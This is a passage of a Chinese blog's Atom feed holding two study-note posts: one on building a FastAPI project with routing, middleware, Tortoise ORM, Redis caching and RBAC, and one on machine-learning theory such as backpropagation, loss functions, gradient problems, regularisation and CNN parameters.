<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>网络安全</title>
  
  <subtitle>学习笔记</subtitle>
  <link href="https://myprefer.github.io/atom.xml" rel="self"/>
  
  <link href="https://myprefer.github.io/"/>
  <updated>2024-10-06T07:46:02.345Z</updated>
  <id>https://myprefer.github.io/</id>
  
  <author>
    <name>Myperfer</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>FastAPI项目 从构建到部署</title>
    <link href="https://myprefer.github.io/post/FastAPI%E9%A1%B9%E7%9B%AE-%E4%BB%8E%E6%9E%84%E5%BB%BA%E5%88%B0%E9%83%A8%E7%BD%B2.html"/>
    <id>https://myprefer.github.io/post/FastAPI%E9%A1%B9%E7%9B%AE-%E4%BB%8E%E6%9E%84%E5%BB%BA%E5%88%B0%E9%83%A8%E7%BD%B2.html</id>
    <published>2024-09-24T09:31:51.000Z</published>
    <updated>2024-10-06T07:46:02.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastAPI项目-从构建到部署"><a href="#FastAPI项目-从构建到部署" class="headerlink" title="FastAPI项目 从构建到部署"></a>FastAPI项目 从构建到部署</h1><h2 id="项目框架基本结构"><a href="#项目框架基本结构" class="headerlink" title="项目框架基本结构"></a>项目框架基本结构</h2><p><strong>FastAPI</strong></p><ul><li><p><strong>路由, 视图</strong></p><ul><li>APIRouter</li><li>Include_router</li><li>Jinja2</li></ul></li><li><p><strong>中间件</strong></p><ul><li>cookie</li><li>session</li><li>request, response</li></ul></li><li><p><strong>安全</strong></p><ul><li><strong>JWT</strong></li><li><strong>RBAC</strong></li><li>Depends</li><li>Exception</li></ul></li><li><p><strong>第三方库</strong></p><ul><li>短信</li><li>支付(微信, 支付宝)</li><li><strong>数据库(MySQL, pg)</strong></li><li><strong>缓存(File, Redis)</strong></li></ul></li></ul><h3 id="项目架构"><a href="#项目架构" class="headerlink" title="项目架构"></a>项目架构</h3><pre><code></code></pre><h2 id="项目基础构建"><a href="#项目基础构建" class="headerlink" title="项目基础构建"></a>项目基础构建</h2><h3 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h3><pre><code class="python">application.add_event_handler(&quot;startup&quot;, startup(application))application.add_event_handler(&quot;shutdown&quot;, stopping(application))</code></pre><p>启动时调用<code>startup()</code>函数, 关闭时调用<code>stopping()</code>函数</p><p><code>startup</code>函数:</p><pre><code class="python">def startup(app: FastAPI) -&gt; Callable:    &quot;&quot;&quot;    FastApi 启动完成事件    :param app: FastAPI    :return: start_app    &quot;&quot;&quot;    async def app_start() -&gt; None:        # APP启动完成后触发        print(&quot;启动完毕&quot;)        pass    return app_start</code></pre><h3 id="异常错误处理"><a href="#异常错误处理" class="headerlink" title="异常错误处理"></a>异常错误处理</h3><pre><code class="python">application.add_exception_handler(HTTPException, http_error_handler) # http错误 需实现http_error_handlerapplication.add_exception_handler(RequestValidationError, http422_error_handler) # 验证错误 需实现http422_error_handlerapplication.add_exception_handler(UnicornException, unicorn_exception_handler) # 启动错误 需实现unicorn_exception_handler</code></pre><p><code>http_error_handler</code>实现</p><pre><code class="python">async def http_error_handler(_: Request, exc: HTTPException):    &quot;&quot;&quot;    http异常处理    :param _:    :param exc:    :return:    &quot;&quot;&quot;    return JSONResponse(&#123;        &quot;code&quot;: exc.status_code,        &quot;message&quot;: exc.detail,        &quot;data&quot;: exc.detail    &#125;, status_code=exc.status_code)</code></pre><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><pre><code class="python">router = APIRouter()application.include_router(router)</code></pre><h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><pre><code class="python">application.add_middleware(Middleware) # 手动实现session# sessionapplication.add_middleware(    SessionMiddleware,    secret_key=&quot;session&quot;,    session_cookie=&quot;f_id&quot;,    # max_age=4)# 跨域请求application.add_middleware(    CORSMiddleware,    allow_origins=settings.CORS_ORIGINS,    allow_credentials=settings.CORS_ALLOW_CREDENTIALS,    allow_methods=settings.CORS_ALLOW_METHODS,    allow_headers=settings.CORS_ALLOW_HEADERS,)</code></pre><h2 id="路由-1"><a href="#路由-1" class="headerlink" title="路由"></a>路由</h2><ul><li><p>用一个文件来统一管理路由, 避免混乱</p><pre><code class="python">api_router = APIRouter(prefix=&quot;/api/v1&quot;)api_router.post(&quot;/test/oath2&quot;, tags=[&quot;测试oath2授权&quot;])(test_oath2)api_router.include_router(user.router, prefix=&#39;/admin&#39;, tags=[&quot;用户管理&quot;])api_router.include_router(role.router, prefix=&#39;/admin&#39;, tags=[&quot;角色管理&quot;])api_router.include_router(access.router, prefix=&#39;/admin&#39;, tags=[&quot;权限管理&quot;])api_router.include_router(websocket.router, prefix=&#39;/ws&#39;, tags=[&quot;WebSocket&quot;])api_router.include_router(wechat.router, prefix=&#39;/wechat&#39;, tags=[&quot;微信授权&quot;])api_router.include_router(sms.router, prefix=&#39;/sms&#39;, tags=[&quot;短信接口&quot;])api_router.include_router(cos.router, prefix=&#39;/cos&#39;, tags=[&quot;对象存储接口&quot;])</code></pre></li><li><p>归类于总结注释:</p><pre><code class="python">ApiRouter.get(&quot;/index&quot;, tags=[&quot;api路由&quot;], summary=&quot;注册接口&quot;)(index)ApiRouter.post(&quot;/login&quot;, tags=[&quot;api路由&quot;], summary=&quot;登陆接口&quot;)(login)</code></pre><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240929165137.png"></p></li><li><p><a href="http://127.0.0.1:8000/redoc">http://127.0.0.1:8000/redoc</a> api文档<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240929165445.png"></p></li></ul><h2 id="ORM数据库"><a href="#ORM数据库" class="headerlink" title="ORM数据库"></a>ORM数据库</h2><h4 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h4><pre><code class="python">DB_ORM_CONFIG = &#123;    &quot;connections&quot;: &#123;        &quot;base&quot;: &#123;            &#39;engine&#39;: &#39;tortoise.backends.mysql&#39;,            &quot;credentials&quot;: &#123;                &#39;host&#39;: os.getenv(&#39;BASE_HOST&#39;, &#39;127.0.0.1&#39;),                &#39;user&#39;: os.getenv(&#39;BASE_USER&#39;, &#39;root&#39;),                &#39;password&#39;: os.getenv(&#39;BASE_PASSWORD&#39;, &#39;123456&#39;),                &#39;port&#39;: int(os.getenv(&#39;BASE_PORT&#39;, 3306)),                &#39;database&#39;: os.getenv(&#39;BASE_DB&#39;, &#39;base&#39;),            &#125;        &#125;,    &#125;,    &quot;apps&quot;: &#123;        &quot;base&quot;: &#123;&quot;models&quot;: [&quot;models.base&quot;], &quot;default_connection&quot;: &quot;base&quot;&#125;    &#125;,    &#39;use_tz&#39;: False,    &#39;timezone&#39;: &#39;Asia/Shanghai&#39;&#125;async def register_mysql(app: FastAPI):    # 注册数据库    register_tortoise(        app,        config=DB_ORM_CONFIG,        generate_schemas=False, # 是否自动创建数据库        add_exception_handlers=True,    )</code></pre><ul><li>可先完成代码, 后直接生成表, 防止数据类型冲突</li></ul><h4 id="数据库模型示例"><a href="#数据库模型示例" class="headerlink" title="数据库模型示例"></a>数据库模型示例</h4><pre><code class="python">class User(Model):    username = fields.CharField(null=True, max_length=20, description=&quot;用户名&quot;)    type = fields.BooleanField(default=False, description=&quot;用户类型 True:超级管理员 False:普通管理员&quot;)    password = fields.CharField(null=True, max_length=255)    nickname = fields.CharField(default=&#39;binkuolo&#39;, max_length=255, description=&#39;昵称&#39;)    u_phone = fields.CharField(null=True, description=&quot;手机号&quot;, max_length=11)    u_email = fields.CharField(null=True, description=&#39;邮箱&#39;, max_length=255)    full_name = fields.CharField(null=True, description=&#39;姓名&#39;, max_length=255)    u_status = fields.IntField(default=0, description=&#39;0未激活 1正常 2禁用&#39;)    head_img = fields.CharField(null=True, max_length=255, description=&#39;头像&#39;)    sex = fields.IntField(default=0, null=True, description=&#39;0未知 1男 2女&#39;)    remarks = fields.CharField(null=True, max_length=30, description=&quot;备注&quot;)    client_host = fields.CharField(null=True, max_length=19, description=&quot;访问IP&quot;)    create_time = fields.DatetimeField(auto_now_add=True, description=&#39;创建时间&#39;)    update_time = fields.DatetimeField(auto_now=True, description=&quot;更新时间&quot;)    class Meta:        table_description = &quot;用户&quot;        table = &quot;user&quot;</code></pre><h2 id="缓存数据库Redis"><a href="#缓存数据库Redis" class="headerlink" title="缓存数据库Redis"></a>缓存数据库Redis</h2><h4 id="连接配置"><a href="#连接配置" class="headerlink" title="连接配置"></a>连接配置</h4><pre><code class="python">async def sys_cache() -&gt; Redis:    &quot;&quot;&quot;    系统缓存    :return: cache 连接池    &quot;&quot;&quot;    # 从URL方式创建redis连接池    sys_cache_pool = aioredis.ConnectionPool.from_url(        f&quot;redis://&#123;os.getenv(&#39;CACHE_HOST&#39;, &#39;127.0.0.1&#39;)&#125;:&#123;os.getenv(&#39;CACHE_PORT&#39;, 6379)&#125;&quot;,        db=os.getenv(&#39;CACHE_DB&#39;, 0),        encoding=&#39;utf-8&#39;,        decode_responses=True    )    return Redis(connection_pool=sys_cache_pool)</code></pre><h4 id="数据库查询"><a href="#数据库查询" class="headerlink" title="数据库查询"></a>数据库查询</h4><pre><code class="python">async def test_my_redis_depends(today: int, cache: Redis = Depends(sys_cache)):    # 连接池放在依赖注入    # await cache.set(name=&quot;today&quot;, value=today)    await cache.set(name=&quot;ex_today&quot;, value=today, ex=60) # ex 过期时间    # value = await cache.get(&quot;today&quot;)    return success(msg=f&quot;今天是&#123;today&#125;号&quot;, data=[])</code></pre><h2 id="中间件-1"><a href="#中间件-1" class="headerlink" title="中间件"></a>中间件</h2><pre><code class="python">application.add_middleware(    CORSMiddleware,    allow_origins=settings.CORS_ORIGINS,    allow_credentials=settings.CORS_ALLOW_CREDENTIALS,    allow_methods=settings.CORS_ALLOW_METHODS,    allow_headers=settings.CORS_ALLOW_HEADERS,)</code></pre><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><pre><code class="python">    async def __call__(self, scope: Scope, receive: Receive, send: Send) -&gt; None:        if scope[&quot;type&quot;] not in (&quot;http&quot;, &quot;websocket&quot;):  # pragma: no cover            await self.app(scope, receive, send)            return        start_time = time.time()        req = Request(scope, receive, send)        if not req.session.get(&quot;session&quot;):            req.session.setdefault(&quot;session&quot;, random_str())</code></pre><h2 id="RBAC权限设计"><a href="#RBAC权限设计" class="headerlink" title="RBAC权限设计"></a>RBAC权限设计</h2><h4 id="RBAC-Role-Based-Access-Control-–-基于角色（Role）的访问控制"><a href="#RBAC-Role-Based-Access-Control-–-基于角色（Role）的访问控制" class="headerlink" title="RBAC (Role-Based Access Control – 基于角色（Role）的访问控制)"></a>RBAC (Role-Based Access Control – 基于角色（Role）的访问控制)</h4><p>简单来说，就是通过将<strong>权限</strong>分配给-&gt;<strong>角色</strong>，再将<strong>角色</strong>分配给-&gt;<strong>用户</strong>，来实现对系统资源的访问控制</p><p>一个用户拥有若干角色，每一个角色拥有若干权限。这样，就构造成“用户-角色-权限”的授权模型。在这种模型中，<strong>用户与角色之间，角色与权限之间，一般者是多对多的关系</strong></p><ol><li><strong>角色（Role）</strong>：角色是指在系统中具有一组相关权限的抽象概念，代表了用户在特定上下文中的身份或职能，例如管理员、普通用户等。</li><li><strong>权限（Permission）</strong>：权限是指对系统资源进行操作的许可，如读取、写入、修改等。权限可以被分配给角色。</li><li><strong>用户（User）</strong>：用户是指系统的实际使用者，每个用户可以被分配一个或多个角色。</li><li><strong>分配（Assignment）</strong>：分配是指将角色与用户关联起来，以赋予用户相应的权限。</li></ol><p><strong>权限控制流程</strong></p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20241006143101.png"></p><p><strong>权限表</strong></p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20241006143140.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;FastAPI项目-从构建到部署&quot;&gt;&lt;a href=&quot;#FastAPI项目-从构建到部署&quot; class=&quot;headerlink&quot; title=&quot;FastAPI项目 从构建到部署&quot;&gt;&lt;/a&gt;FastAPI项目 从构建到部署&lt;/h1&gt;&lt;h2 id=&quot;项目框架基本结构&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 理论基础</title>
    <link href="https://myprefer.github.io/post/ML-%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html"/>
    <id>https://myprefer.github.io/post/ML-%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html</id>
    <published>2024-09-07T16:31:52.000Z</published>
    <updated>2024-09-07T16:32:29.053Z</updated>
    
    <content type="html"><![CDATA[<h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h2><h4 id="讨论前向传播和反向传播的流程？"><a href="#讨论前向传播和反向传播的流程？" class="headerlink" title="讨论前向传播和反向传播的流程？"></a>讨论前向传播和反向传播的流程？</h4><p><strong>前向传播</strong></p><ol><li>在输入层输入特征向量, 传递到隐藏层</li><li>在隐藏层不断计算出每一层神经元得到的结果</li><li>通过激活函数得到的输出</li><li>将输出传递到下一层</li><li>输出层: 在隐藏层最后的输出经过激活函数后, 得到最终的预测值</li></ol><p><strong>反向传播</strong></p><ol><li><p>通过前向传播得到网络的预测值, 利用损失函数, 计算输出层的损失</p></li><li><p>从输出层开始, 计算损失对输出层的梯度, 并逐层反向传播该梯度</p></li><li><p>其后每一层通过求导的链式法则, 利用上一层传递来的梯度, 计算当前层的损失函数对各参数的梯度</p></li><li><p>根据计算得到的梯度, 利用优化算法(如梯度下降), 计算并更新参数, 减少损失值</p></li></ol><h4 id="解释梯度下降法-并结合梯度下降法讲讲神经网络工作的流程"><a href="#解释梯度下降法-并结合梯度下降法讲讲神经网络工作的流程" class="headerlink" title="解释梯度下降法, 并结合梯度下降法讲讲神经网络工作的流程"></a>解释梯度下降法, 并结合梯度下降法讲讲神经网络工作的流程</h4><p><strong>解释梯度下降法</strong></p><p>梯度下降算法时一种用于最小化损失函数的优化算法, 通过调整神经网络中的参数来优化模型</p><p>梯度时损失函数对参数的(导数)偏导, 直观体现为损失函数下降最快的方向, 沿着该方向调整参数可以使损失减小</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408082044259.png"></p><p>算法公式为, 其中α为学习率, J为代价函数</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407312122596.png"></p><p><strong>神经网络工作流程</strong></p><ol><li>初始化参数, 如对<code>y = W * x + b</code>的W和b进行随机初始化</li><li>输入数据, 进行前向传播, 将数据通过网络逐层从输入层传递到输出层</li><li>在隐藏层的各层进行指定的计算并通过激活函数得到输出, 逐层前线传播</li><li>在输出层得到预测值</li><li>利用损失函数计算输出层的预测值的损失</li><li>从输出层开始, 反向逐层计算损失函数对于各参数的梯度(反向传播)</li><li>根据梯度下降公式<code>W = W - α * L&#39;(W, b)</code>和<code>b = b - α * L&#39;(W, b)</code>(<em>偏导打不出来</em>)更新参数, 其中<code>L</code>是损失函数, α是学习率</li><li>重复上述的前向传播和反向传播, 进行多次迭代训练, 知道损失函数收敛到一个较小的值</li></ol><h4 id="谈谈你对损失函数的理解-并解释交叉熵损失函数的原理"><a href="#谈谈你对损失函数的理解-并解释交叉熵损失函数的原理" class="headerlink" title="谈谈你对损失函数的理解, 并解释交叉熵损失函数的原理"></a>谈谈你对损失函数的理解, 并解释交叉熵损失函数的原理</h4><p><strong>损失函数</strong></p><p>数据在经过模型的处理后会得到一个预测值, 预测值和真实值之间往往有所差距, 这个差距越小就说明模型预测的越准确, 因此在机器学习中, 我们希望这个差距尽可能小。 损失函数就是可以体现出这个差距的函数, 在神经网络中, 损失函数接收模型的预测值, 并计算预测值与真实值的差距, 为接下来的反向传播提供数据, 进而提供更新模型参数的方向</p><p><strong>交叉熵损失函数</strong></p><p>在二分类问题中交叉熵损失函数为:</p><pre><code>L = −[y*log(y^) + (1−y)*log(1−y^)]</code></pre><p><em><code>y^</code>为预测值</em></p><p>当真实值为1时, 损失函数为<code>-log(y^)</code>, y^的值越接近1, 损失越小</p><p>同样的, 当真实值为0时, 损失函数为<code>-log(1-y^)</code>, y^的值越接近0, 损失越小</p><p>这样, 可以有针对性的对预测值与真实值的差距进行计算, 在二分类问题中, 一个数据的标签(即真实值)不是1就是0, 用该函数可以很好的体现预测值于真实标签的差距</p><p>类似的, 在多分类问题中, 使用one-hot编码实现, 具体为:<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408092215513.png"></p><p>yk是真实标签在第k类上的值, 例如有5类, 实际为第一类, 则<code>y = [1,0,0,0,0]</code>, 这样损失函数为<code>-log(y1^)</code>, 能够准确的反映这个差距</p><h4 id="谈谈你对激活函数的理解"><a href="#谈谈你对激活函数的理解" class="headerlink" title="谈谈你对激活函数的理解"></a>谈谈你对激活函数的理解</h4><p>激活函数的主要作用是引入非线性因素, 让数据进行非线性变换, 使神经网络可以拟合复杂的非线性关系</p><p>如果没有用激活函数, 神经网络只会执行线性变换, 每一层的输入都是上一层输出的线性变换, 这样, 即使网络有很多层, 也只相当于一个单层线性模型, 不能处理更加复杂的关系</p><p>比如, 一个隐藏层为<code>h(1) = W(1)*x + b(1)</code>, 另一个为&#96;&#96;h(2) &#x3D; W(2)*x + b(2)&#96;, 那么经过两层的计算, 结果为<br>$$<br>h(2)&#x3D;W(2)(W(1)x+b(1))+b(2)<br>    &#x3D;(W(2)W(1))x+(W(2)b(1)+b(2))<br>    &#x3D;W’x + b’<br>$$<br>仍然是线性变换, 那么这么多层的隐藏层就没有意义了, 因为一层就能处理线性组合, 这时最终的输出也仍然是线性组合</p><p>如果在这两个层之间引入激活函数, 神经网络的层与层之间不再是简单的线性组合, 而是产生了更加复杂的的非线性关系</p><h4 id="解释梯度消失和梯度爆炸-并给出你觉的有效的解决方法"><a href="#解释梯度消失和梯度爆炸-并给出你觉的有效的解决方法" class="headerlink" title="解释梯度消失和梯度爆炸, 并给出你觉的有效的解决方法"></a>解释梯度消失和梯度爆炸, 并给出你觉的有效的解决方法</h4><p><strong>梯度消失和梯度爆炸</strong></p><p>假设一个神经网络有3个隐藏层, 其损失函数为<code>L</code>, 激活函数为<code>o</code>, 输出为<code>y</code></p><p>即<br>$$<br>y^{(i)} &#x3D; o(z^{(i)})) &#x3D; o(W^{(i)}x^{(i)} + b^{(i)})<br>$$<br> 例如, 其第<code>3</code>层的输出为<br>$$<br>y^{(3)} &#x3D; o(z^{(3)})&#x3D; o(W^{(3)}h^{(3)} + b^{(3)})<br>$$<br>根据反向传播的原理, 第1层参数的梯度计算公式为<br>$$<br>\frac{∂L}{∂W^{(1)}}&#x3D;\frac{∂L}{∂y^{(3)}}\frac{∂y^{(3)}}{∂z^{(3)}}\frac{∂z^{(3)}}{∂x^{(3)}}\frac{∂x^{(3)}}{∂z^{(2)}}\frac{∂z^{(2)}}{∂x^{(2)}}\frac{∂x^{(2)}}{∂z^{(1)}}\frac{∂z^{(1)}}{∂W^{(1)}}<br>$$<br>也就是<br>$$<br>\frac{∂L}{∂W^{(1)}}&#x3D;\frac{∂L}{∂y^{(3)}}o’(z^{(3)})W^{(3)}o’(z^{(2)})W^{(2)}o’(z^{(1)})<br>$$<br>如果激活函数o为sigmoid函数, 其导数<code>o&#39;(x) = o(x)(1-o(x))</code>, 最大值为1&#x2F;4, 同样的, 如果使用tanh作为激活函数, 其导数也小于1</p><p>如果初始的W小于1, 那么|W*o’(z)|&lt;&#x3D; 1&#x2F;4, 经过很多层的求导后, 梯度会因为指数级的下降而将变得非常小, 使参数变化非常缓慢, 引起了梯度消失问题</p><p>如果梯度消失, 梯度值几乎会变成0那么不管怎么选择学习率,训练都不会有进展, 梯度消失对网络底部层尤为严重, 仅仅顶部层能训练的较好, 无法让神经网络更深</p><p>同样的, 如果初始W比较大, 使|W*o’(z)| &gt; 1, 前面的层的梯度乘W*o’(z)的次数比后面的层更多, 前面的层比后面的层的梯度变化更快, 梯度会因为指数爆炸变得非常大, 引起梯度爆炸问题</p><p>梯度爆炸可能会导致数据超出值域, 会让模型对学习率很敏感, 需要在训练过程中不断调整学习率</p><p><strong>梯度消失和梯度爆炸的解决方法</strong></p><ul><li><p>使你用ReLU激活函数, relu的导数要么是1, 要么是0, 导数是1的时候就不存在梯度消失了</p></li><li><p>批量归一化(BN层), 使得每层的激活值的分布具有固定的均值(0)和方差(1), 使得激活输入值落在非线性函数对输入比较敏感的区域,  这样输入的小变化就会导致损失函数较大的变化, 使得让 梯度变大, 避免梯度消失问题产生</p></li><li><p>正则化, 梯度爆炸是由于W太大, 正则化可以防止其过大, 从而防止梯度爆炸</p></li><li><p>采用合适的权重初始化方法, 避免初始的权重过小或过大, 比如通过将权重初始化为从均值为0、方差为 1&#x2F;fan_avg的分布中的值(xavier初始化)</p></li><li><p>梯度裁剪, 强行限制梯度的大小, 防止梯度爆炸</p></li><li><p>使用残差网络</p><p>ResNet的操作相当于<br>$$<br>y’’ &#x3D; g(f(x))变为y’’&#x3D;f(x) + g(f(x))<br>$$<br>这样其导数<br>$$<br>\frac{∂y’’}{∂w}&#x3D;\frac{∂y}{∂w}+\frac{∂y’}{∂w}<br>$$<br>即使<code>y&#39;</code>的导数非常小, 加上y的导数后也不会太小</p></li></ul><h4 id="解释过拟合-欠拟合-并给出你觉得有效的解决方法"><a href="#解释过拟合-欠拟合-并给出你觉得有效的解决方法" class="headerlink" title="解释过拟合, 欠拟合, 并给出你觉得有效的解决方法"></a>解释过拟合, 欠拟合, 并给出你觉得有效的解决方法</h4><p><strong>过拟合</strong></p><p>模型过于强调拟合原始数据, 这样就忽略了预测新数据这个算法本质。对于原始数据, 该模型表现的非常好, 但是对于一个新数据, 其表现很可能会很差, 即不能很好的泛化</p><p>直观表现如下<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031146526.png"></p><p>模型过拟合的原因主要有:</p><ul><li>模型容量太大, 过于追求拟合所有细节</li><li>训练数据数量太少</li><li>训练数据存在噪声的干扰</li></ul><p><strong>解决过拟合的方法</strong>有:</p><ul><li>增加训练数据的量</li><li>调整训练轮次和学习率等参数</li><li>降低模型的复杂度(减小模型容量), 过拟合说明模型的拟合能力过强, 将模型简化可以弱化其拟合能力</li><li>正则化(regularization), 在损失函数中添加正则项, 可以使模型的权重w保持在较小的值, 避免模型过于复杂</li><li>每轮训练后, 实时保存模型, 输出模型在测试集上损失, 最后选取在测试集上损失最小的模型</li></ul><p><strong>欠拟合</strong></p><p>模型无法很好的适应训练集, 会有较大的误差<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031145373.png"></p><p>模型出现欠拟合的原因一般有:</p><ul><li>模型过于简单</li><li>特征不足</li><li>训练轮次太少</li></ul><p>如果欠拟合, 说明模型的学习能力不足, 增加训练数据的数量基本上不能解决问题</p><p>因此, <strong>欠拟合的解决方法</strong>有</p><ul><li>提高模型的复杂度, 可以增加神经网络隐藏层的层数, 或者直接舍弃原来的算法, 用更加复杂的算法模型</li><li>调整参数, 比如修改学习率, 训练轮次, 等等</li><li>引入更多有用的特征</li><li>降低正则化的约束, 正则化本来是防止模型过拟合, 但是如果模型欠拟合了, 那么就说明不需要这么强的约束, 可以降低正则化参数, 或者直接去除正则化项</li></ul><h4 id="讨论你对和正则化-regularization-和归一化-normallization-的认识"><a href="#讨论你对和正则化-regularization-和归一化-normallization-的认识" class="headerlink" title="讨论你对和正则化(regularization)和归一化(normallization)的认识"></a>讨论你对和正则化(regularization)和归一化(normallization)的认识</h4><p><strong>正则化</strong></p><p>正则化是用来防止模型过拟合的方法</p><p>例如, 模型为<code>h(x) = Wx + b</code>, 损失函数为<code>L = 1/2m * (∑(h(x) - y)^2)</code></p><p>将代价函数修改为(L2正则化):<br>$$<br>L &#x3D; \frac{1}{2m}(∑^m_{i&#x3D;0}(h(x^i) - y^i)^2) + \frac{λ}{2m}∑^n_{i&#x3D;0}W^2_i<br>$$<br>即添加<code>λ*xx</code>项也就是正则化项(惩罚项), 其中λ为正则化参数</p><p>进行梯度下降时, 某个参数的更新为:<br>$$<br>W_i &#x3D; W_i - lr\frac{∂L}{∂W_i}<br>$$<br>损失函数对参数W_i的梯度为<br>$$<br>\frac{∂L}{∂W_i} &#x3D; - \frac{1}{m}∑^m_{j&#x3D;1}(y_j - \hat{y_j})\frac{∂\hat{y_j}}{∂W_i} + λW_i<br>$$<br>则<br>$$<br>W_i&#x3D;(1-lr*λ)W_i-λ\frac{∂L}{∂W_i}<br>$$<br>如果W_i较大, 那么梯度也较大, 其更新的步长也更大, 其被压缩的程度, 也就是惩罚力度也更大, 反之处罚力度较小</p><p>正则化参数λ的大小可以调整惩罚的力度, 如果λ太小, 正则化参数的影响就太小, 达不到效果, 如果太大, 则会对所有的参数都进行很大力度的惩罚, 甚至使其都为0</p><p>这样, 通过正则化, 可以防止某些参数的影响过大, 使其保持较小的值, 限制了模型的复杂性, 也就能够解决过拟合</p><p><strong>归一化</strong></p><p>normalization是一种特征缩放的方法, 是一种常用的数据预处理方法, 大部分是指把特征数据范围都缩放到(0, 1)或(-1, 1)之间<br>例如: 左边是未进行归一化的数据, x的范围是(0, 100), y的范围是(0,10), 右边是进行归一化后的数据, 范围都在(0, 1)之间</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408130107297.png"></p><p>为什么要归一化:</p><ul><li><p>以上图中的数据为例, 不同特征的数据范围可能相差很大, 导致某些特征对模型的训练产生较大的影响, 而其他的特征的影响可能会被忽略, 这样模型可能就不太准确</p></li><li><p>如果不进行归一化, 因为不同特征的范围相差较大, 直观来看, 数据会变”扁”, 进行梯度下降的时候要走很多的”弯路”<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408130106803.png"></p><p>而进行归一化之后, 可以少走很多弯路, 能让训练速度加快</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408130110513.png"></p></li></ul><h4 id="谈谈你对卷积神经网络的理解-并讨论对于cnn具体参数都是什么和如何选择"><a href="#谈谈你对卷积神经网络的理解-并讨论对于cnn具体参数都是什么和如何选择" class="headerlink" title="谈谈你对卷积神经网络的理解, 并讨论对于cnn具体参数都是什么和如何选择"></a>谈谈你对卷积神经网络的理解, 并讨论对于cnn具体参数都是什么和如何选择</h4><p>卷积神经网络是一种用来处理图像数据的深度学习模型, 其核心是通过卷积操作提取图像的局部特征, 卷积神经网络通常包括卷积层, 非线性层, 池化层, 全连接层, 这些层按照一定顺序叠加在一起, 逐步提取图像特征, 最后通过全连接层进行分类或其他任务</p><p>在处理图像时, 由于图像特征的数据量太大(像素太多), 导致计算成本太高, 效率很低。</p><p> 同时, 在传统的全连接神经网络中, 每个神经元都与前一层的每个神经元相连, 这会导致参数数量暴增。而通过卷积操作, 使用相同的卷积核处理整张图像, 这样不仅大幅减少了参数数量, 还保留了图像的空间结构</p><p><strong>参数及选择</strong></p><ul><li><p><strong>learning rate 学习率</strong>, 一般啊在1e-1和1e-4之间选择, 需要手动调整</p></li><li><p><strong>epochs 训练轮次</strong> 一般轮次设定为几十到几百次, 不过一般不用全部训练完, 可以通过早停法提前结束</p></li><li><p><strong>batch_size 批量大小</strong>, 根据设备性能选择, 常用的批量大小有32, 64, 128, 256</p></li><li><p><strong>网络层数</strong> 根据模型任务的复杂度选择</p></li><li><p>正则化参数 </p><ul><li>dropout比例 0.2~0.5之间选择</li><li>L2 正则化系数lambda 常用 1e-4 到 1e-2 之间的值</li></ul></li><li><p><strong>kernel size 卷积核大小</strong> 通常用3x3或5x5, 较小的卷积核有助于捕捉细节, 较大的卷积核有助于获取更广泛的特征</p></li><li><p><strong>卷积核个数</strong> 每层卷积的卷积核个数决定了特征图的深度, 通常从 32 或 64 个卷积核开始, 随着网络的加深逐渐增加卷积核数量</p></li><li><p><strong>padding</strong> 填充, 在输入特征图的每一边添加一定数目的行列, 常见的选择是 “same” 填充(保持特征图尺寸不变)或 “valid” 填充(不添加填充), 根据任务需求选择合适的填充方式</p></li><li><p><strong>stride</strong> 步长, 卷积核经过输入特征图的采样间隔, 常用的步长是1或2, 大的步长可以减少特征图尺寸, 但是会损失信息</p></li><li><p><strong>pooling size</strong> 池化大小 通常设置为2x2</p></li></ul><h4 id="1-1的卷积有什么作用"><a href="#1-1的卷积有什么作用" class="headerlink" title="1*1的卷积有什么作用"></a>1*1的卷积有什么作用</h4><ul><li><p>1x1卷积核的高和宽都等于1, 意味着它不会识别空间信息, 因为他每次只看一个空间像素所以不会去识别通道中的空间信息</p></li><li><p>1x1卷积不识别空间模式, 只是融合不同通道的信息</p></li><li><p>相当于输入形状为n_h*n_w*c, 权重为c_o*c_i的全连接层<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408141427758.png"></p></li></ul><p><strong>作用</strong></p><ul><li><p>融合不同通道的信息, 可以认为是不做空间的匹配, 只是在输入层直接做输入通道和输出通道的融合, 等价于将整个输入拉成一个向量, 通道数等于特征的数量, 卷积核就相当于一个全连接层</p></li><li><p>1x1卷积可以在不改变输入特征图空间分辨率的情况下, 改变其通道数, 卷积层的输出的通道数由卷积核的个数决定, 通过设置1x1卷积核的数量, 可以做到升维&#x2F;降维</p></li></ul><h4 id="卷积神经网络中池化的作用"><a href="#卷积神经网络中池化的作用" class="headerlink" title="卷积神经网络中池化的作用"></a>卷积神经网络中池化的作用</h4><ul><li><p><strong>提取主要特征</strong>, 例如, 最大池化可以选择区域内的最大值, 可以帮助无论更好地捕捉边缘, 角点等特征</p></li><li><p>池化可以减少特征图的空间尺寸(宽和高), 降低了计算的复杂度, 提高效率</p></li><li><p><strong>缓解卷积层对位置的敏感性</strong>, 也就是增强<strong>位置不变性</strong>, 